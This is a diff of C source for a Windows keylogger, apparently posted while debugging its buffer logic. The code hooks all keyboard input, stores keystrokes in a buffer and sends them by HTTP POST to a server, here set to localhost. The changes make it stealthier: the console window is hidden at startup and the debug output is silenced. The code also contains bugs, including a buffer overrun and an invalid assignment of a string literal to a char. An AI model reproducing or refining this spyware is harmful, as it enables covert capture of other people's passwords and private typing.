@@ -1,4 +1,3 @@
-#include <stdio.h>
 #include <Windows.h>
 #include <WinInet.h>
 
@@ -6,7 +5,7 @@
 
 HHOOK hHook = { NULL };
 
-#define N 128
+#define N 36
 char capture[N];
 int captureLength = 0;
 
@@ -27,18 +26,21 @@ void hideWindow() {
 	HWND window;
 	AllocConsole();
 	window = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(window, 1);
+	ShowWindow(window, 0);
 }
 
 int post(char capture[]) {
 	char* hdrs = "Content-Type: text/plain";
 	LPCSTR accept[2] = { "text/plain", NULL };
 
-	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
+	HINTERNET hSession = InternetOpenA("Mozilla / 5.0 (Windows NT 10.0; Win64; x64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 92.0.4515.131 Safari / 537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
 	HINTERNET hConnect = InternetConnectA(hSession, "localhost", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
 	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, accept, 0, 0);
 
 	HttpSendRequestA(hRequest, hdrs, strlen(hdrs), capture, strlen(capture));
+
+	capture[0] = "\0";
+	captureLength = 0;
 
 	return 1;
 }
@@ -62,20 +64,16 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 
 		char result;
 		if (ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0) == 0) {
-			printf("\n Error copying ascii'd result to buffer!");
+			//printf("\n Error copying ascii'd result to buffer!");
 		}
 
 		capture[captureLength] = result;
 		// CODE IN QUESTION
 		if (captureLength == N) {
 			post(capture);
-
-			capture[0] = "\0";
-			captureLength = 0;
 		}
 		else {
 			captureLength++;	
-			printf("%d ", captureLength);
 		}
 
 		// END CODE IN QUESTION
@@ -85,9 +83,11 @@ LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM
 }
 
 int main(void) {
+	hideWindow();
+
 	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
 	if (hHook == NULL) {
-		printf("Error setting windows kb hook.");
+		//
 	}
 
 	while (GetMessage(NULL, NULL, 0, 0));
